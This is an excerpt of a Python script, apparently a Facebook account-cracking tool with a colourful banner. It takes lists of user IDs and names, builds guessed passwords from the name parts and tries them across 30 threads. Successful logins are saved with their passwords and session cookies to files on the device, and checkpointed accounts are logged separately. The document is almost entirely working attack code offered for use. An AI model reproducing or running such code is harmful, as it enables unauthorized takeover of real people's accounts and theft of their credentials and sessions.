...
logo =f"""
\033[1;35m███    ██ \033[1;34m██\x1b[1;96m ██████ \033[1;91m      ██ \033[1;33m ██████  \033[1;32m███    ██     
\033[1;35m████   ██ \033[1;34m██\x1b[1;96m ██   ██ \033[1;91m     ██\033[1;33m ██    ██ \033[1;32m████   ██     
\033[1;35m██ ██  ██ \033[1;34m██\x1b[1;96m ██████ \033[1;91m      ██ \033[1;33m██    ██ \033[1;32m█\033[1;32m█ \033[1;32m██  ██     
\033[1;35m██  ██ ██ \033[1;34m██\x1b[1;96m ██   ██ \033[1;91m██ \033[1;91m  ██ \033[1;33m██    ██ \033[1;32m██  ██ ██     
\033[1;35m██   ████ \033[1;34m██\x1b[1;96m ██   ██ \033[1;91m █████   \033[1;33m██████ \033[1;32m ██   ████  
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} NIRJON NAHUEL
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} SA ASIF
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/NIRJON.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}NIRJON-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[NIRJON~SARMIN] {sid} | {ps} ")
                    open('/sdcard/NIRJON-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}NIRJON-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIRJONb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIRJONb};{ckkk}"
                    print(f"\r\r{G1}[NIRJON~SARMIN] {sid} | {ps} ")
                    open('/sdcard/NIRJON-SARMIN-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[NIRJON-CP] {sid} | {ps} ")
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            with Habib(max_workers=30) as NIRJONworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ...
                                NIRJONworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
#__________________[ RANDOM METHOD ]__________________#
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}NIRJON-SARMIN{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
